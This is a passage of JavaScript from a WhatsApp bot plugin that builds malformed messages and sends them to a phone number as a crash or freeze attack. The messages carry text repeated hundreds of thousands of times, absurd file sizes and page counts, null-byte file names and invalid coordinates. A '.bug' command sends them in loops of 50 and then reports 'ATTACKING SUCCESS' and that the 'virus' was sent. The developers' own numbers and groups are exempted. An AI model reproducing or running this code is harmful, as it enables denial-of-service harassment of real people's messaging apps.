                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg"
                },
                hasMediaAttachment: true
              },
              body: {
                text: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞ꦾ" + "ꦾ".repeat(77777)
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}"
              }
            }
          }
        }
      }), {
        userJid: p47,
        quoted: p48
      });
      await conn.relayMessage(p47, vGenerateWAMessageFromContent7.message, p51 ? {
        participant: {
          jid: p47
        }
      } : {});
      console.log(chalk.green("wait bwang..."));
    }
*/


async function f6(p44, p45, p46 = true) {
      const v88 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
        fileLength: "9999999999999",
        pageCount: 1316134911,
        mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
        fileName: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞",
        fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
        directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1726867151",
        contactVcard: true,
        jpegThumbnail: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg"
      };
      const v89 = {
        documentMessage: v88,
        hasMediaAttachment: true
      };
      await conn.relayMessage(p44, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: v89,
              body: {
                text: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞̤\n" + "\n\n\n\n\n\n\n\n\n\n\n\n@6289526156543".repeat(27000)
              },
              nativeFlowMessage: {
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: ["6289526156543@s.whatsapp.net"],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, p46 ? {
        participant: {
          jid: p44
        }
      } : {});
   //   console.log(chalk.green("wait bwang..."));
    }




    async function f21(p72, p73, p74 = false, p75 = false) {
      const v168 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
        fileLength: "9999999999999",
        pageCount: 9007199254740991,
        mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
        fileName: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞",
        fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1723855952",
        contactVcard: true,
        thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
        thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
        thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
        jpegThumbnail: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg"
      };
      const v169 = {
        title: "",
        documentMessage: v168,
        hasMediaAttachment: true
      };
/*    let vGenerateWAMessageFromContent14 = generateWAMessageFromContent(p72, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: v169,
              body: {
                text: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞"
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
                buttons: [p74 ? {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"💐༑⌁⃰↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞〽️" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞\",\"rows\":[]}]}"
                } : {
                  name: "payment_method",
                  buttonParamsJson: ""
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }, {
                  name: "payment_method",
                  buttonParamsJson: "{}"
                }, {
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"💐༑⌁⃰↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞〽️\",\"sections\":[{\"title\":\"↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: p72,
        quoted: v93
      });
      await conn.relayMessage(p72, vGenerateWAMessageFromContent14.message, p75 ? {
        participant: {
          jid: p72
        }
      } : {});
    //  console.log(chalk.green("wait bwang..."));*/
    }



async function LocaBugs(target) {
 await conn.relayMessage(target, {
       groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭`+'ꦾ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}




async function DocBug(target) {
      let virtex = "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭";
        conn.relayMessage(target, {
          groupMentionedMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };

	


async function NotifKill(target) {
      conn.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }




async function LocSystem(target) {
            let virtex = "⿻ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲 💞 ⿻";
            let memekz = Date.now();

            await conn.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "" + "ꦾ".repeat(50000) + "@X".repeat(90000) + "𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭".repeat(90000) + "ᬃᬃ".repeat(90000) + "⿻".repeat(90000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "AngeLs`" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });            
        };
	

async function f10(p54, p55) {
      var vGenerateWAMessageFromContent10 = generateWAMessageFromContent(p54, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "p",
              caption: "*`𝐀𝐬𝐬𝐚𝐥𝐚𝐦𝐮𝐚𝐥𝐚𝐢𝐤𝐮𝐦 𝐦𝐚𝐬`*𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲" + "ꦾ".repeat(50000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: p54,
        quoted: p55
      });
      await conn.relayMessage(p54, vGenerateWAMessageFromContent10.message, {
        participant: {
          jid: p54
        },
        messageId: vGenerateWAMessageFromContent10.key.id
      });
    }



async function f4(p40, p41) {
      var vGenerateWAMessageFromContent5 = generateWAMessageFromContent(p40, proto.Message.fromObject({
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          mimetype: "penis",
          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          fileLength: "999999999",
          pageCount: 999999999,
          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          fileName: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞" + "\0".repeat(900000),
          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1715880173"
        }
      }), {
        userJid: p40,
        quoted: p41
      });
      await conn.relayMessage(p40, vGenerateWAMessageFromContent5.message, {
        participant: {
          jid: p40
        },
        messageId: vGenerateWAMessageFromContent5.key.id
      });
    }
	

    async function f5(p42, p43) {
      var vGenerateWAMessageFromContent6 = generateWAMessageFromContent(p42, proto.Message.fromObject({
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          mimetype: "image/webp",
          directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          fileLength: "10116",
          mediaKeyTimestamp: "1715876003",
          isAnimated: false,
          stickerSentTs: "1715881084144",
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }), {
        userJid: p42,
        quoted: p43
      });
      await conn.relayMessage(p42, vGenerateWAMessageFromContent6.message, {
        participant: {
          jid: p42
        },
        messageId: vGenerateWAMessageFromContent6.key.id
      });
    }
	
	
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF6(msg);
        for (let v244 = 0; v244 < 50; v244++) {
          //await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f21(target, v96, v103, v108);
         // await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await LocaBugs(target);
          await DocBug(target);
          await NotifKill(target);
          await LocSystem(target);
          //await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await f10(target, v96, v103, v108);
          await f5(target, v96, v103, v108);
          await f21(target, v96, v103, v108);
          await f4(target, v96, v103, v108);
          //await f7(target, v96, v103, v108);
          await f6(target, v96, v103, v108);
          await LocaBugs(target);
          await DocBug(target);
          await NotifKill(target);
          await LocSystem(target);
		  }
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 
} catch (e) {
reply('*Error !!*')
l(e)
}
})



cmd({
    pattern: "bug",
    react: "🔖",
    desc: "To take owner number",
    category: "bug",
    use: '.bug 947xxxxx',
    filename: __filename
},    
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{

 if (!isMe) return reply('_</> owner only..._')   
 if(from.includes('94719199757') || from.includes('94703475691') || from.includes('94711453361')) return reply('Sorry, I cant upload code to my Vajira developer 🥱\nTry to use it on another private!!\n මෝඩ පොන්නය මට ගහන්න ඉයා කක්ක දාලා වරෙන්')
if(from.includes('120363026309634278@g.us') || from.includes('120363028400218278@g.us')) return reply('Sorry, I cant send locks to my Vajira developers group 🥱\nTry using it in another group!!')	
if (!q) return reply(`Example: ${prefix + command} 62×××`)

async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await conn.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
		    
		async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await conn.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}


  const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
  
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(conn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(conn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(conn, target, wanted)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆

    𝐍𝐎𝐓𝐄
> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`)
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 
} catch (e) {
reply('*Error !!*')
l(e)
}
})